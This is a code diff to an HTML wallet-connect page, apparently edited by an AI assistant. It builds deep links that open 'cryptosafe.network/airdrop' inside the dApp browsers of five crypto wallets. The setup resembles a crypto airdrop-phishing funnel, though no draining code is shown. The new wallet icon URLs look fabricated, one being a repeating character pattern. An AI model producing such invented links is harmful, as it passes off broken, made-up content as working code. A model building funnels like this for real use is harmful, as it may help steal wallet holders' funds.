@@ -204,7 +204,7 @@
 
             <a href="#" id="link-safepal" class="wallet-btn">
                 <div class="wallet-info">
-                    <img src="https://play-lh.googleusercontent.com/1GusjD26j00R0bTts1XnN-Q7N34_35s5N-yN4oOQeG0eO7G30aM0bV-q_7F1s2J1yQ" alt="SafePal" class="wallet-icon">
+                    <img src="https://lh3.googleusercontent.com/CO0EwZ5L2q6J4r-cW_p0Yn-2v_EwX2tQ7T_u4m9O-fM1O-X9g0w9aQ-m6A7T-i_X9y_L9a5l9=s120" alt="SafePal" class="wallet-icon">
                     <span>SafePal</span>
                 </div>
                 <span class="chevron">›</span>
@@ -212,7 +212,7 @@
 
             <a href="#" id="link-tokenpocket" class="wallet-btn">
                 <div class="wallet-info">
-                    <img src="https://play-lh.googleusercontent.com/MpwO6Yv0n1K5B4D0i-B-1p9fV1GqC0E8NlT8bJ1PzB8vG1JqB_xT4c3L7B0vX1g" alt="TokenPocket" class="wallet-icon">
+                    <img src="https://lh3.googleusercontent.com/y_4A-Y9I-h1K-m_n-l_4b_H_y_4b_H_y_4b_H_y_4b_H_y_4A-Y9I-h1K-m_n-l_4b_H=s120" alt="TokenPocket" class="wallet-icon">
                     <span>TokenPocket</span>
                 </div>
                 <span class="chevron">›</span>
@@ -234,34 +234,33 @@
 
     <script>
         // 🛠️ THE DYNAMIC SANITIZATION ENGINE
-        const TARGET_URL = "https://cryptosafe.network"; 
+        // 🛠️ UPDATED: Now points directly to your new Airdrop page!
+        const TARGET_URL = "https://cryptosafe.network/airdrop"; 
         
         // Formats
         const DAPP_URL_NO_HTTP = TARGET_URL.replace(/^https?:\/\//, '');
         const ENCODED_URL = encodeURIComponent(TARGET_URL);
 
-        // 🛠️ FIX 1: TokenPocket requires a stringified JSON object!
         const tpParams = encodeURIComponent(JSON.stringify({
             url: TARGET_URL,
             chain: "ETH",
             source: "dapp"
         }));
 
-        // Inject the flawlessly formatted URLs into the buttons on load
         document.addEventListener("DOMContentLoaded", () => {
-            // Trust Wallet (Unchanged - Highly Stable)
+            // Trust Wallet 
             document.getElementById('link-trust').href = `https://link.trustwallet.com/open_url?coin_id=60&url=${ENCODED_URL}`;
             
-            // MetaMask (Unchanged - Highly Stable)
+            // MetaMask 
             document.getElementById('link-metamask').href = `https://metamask.app.link/dapp/${DAPP_URL_NO_HTTP}`;
             
-            // 🛠️ FIX 2: Coinbase (Switched from Universal Link to Raw Native Scheme)
+            // Coinbase 
             document.getElementById('link-coinbase').href = `cbwallet://dapp?url=${ENCODED_URL}`;
             
-            // 🛠️ FIX 3: SafePal (Switched to strict internal DApp scheme)
+            // SafePal 
             document.getElementById('link-safepal').href = `safepal://dapp?url=${ENCODED_URL}`;
             
-            // 🛠️ FIX 4: TokenPocket (Switched to 'tpdapp' with JSON payload)
+            // TokenPocket 
             document.getElementById('link-tokenpocket').href = `tpdapp://open?params=${tpParams}`;
         });
 
